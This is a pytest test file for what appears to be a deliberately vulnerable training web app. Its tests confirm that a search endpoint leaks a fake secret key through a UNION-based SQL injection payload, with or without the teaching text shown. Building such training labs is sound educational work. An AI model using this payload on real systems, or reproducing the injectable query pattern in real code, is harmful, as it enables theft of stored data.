from app.core.seed import seed_database


def test_search_returns_matching_accounts(app, client):
    seed_database(app)
    response = client.get("/a03/search", query_string={"q": "alice"})
    assert response.status_code == 200
    assert b"alice" in response.data


def test_search_union_exfiltrates_secrets_table(app, client):
    seed_database(app)
    payload = "' UNION SELECT id, value FROM a03_secrets -- "
    response = client.get("/a03/search", query_string={"q": payload})
    assert response.status_code == 200
    assert b"sk_live_51NxFakeKeyForTraining000" in response.data


def test_search_union_exfiltration_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    payload = "' UNION SELECT id, value FROM a03_secrets -- "
    response = client.get("/a03/search", query_string={"q": payload})
    assert response.status_code == 200
    assert b"sk_live_51NxFakeKeyForTraining000" in response.data
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_search_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"UNION-Based SQL Injection Data Exfiltration" in response.data
    assert b'href="/a03/search"' in response.data
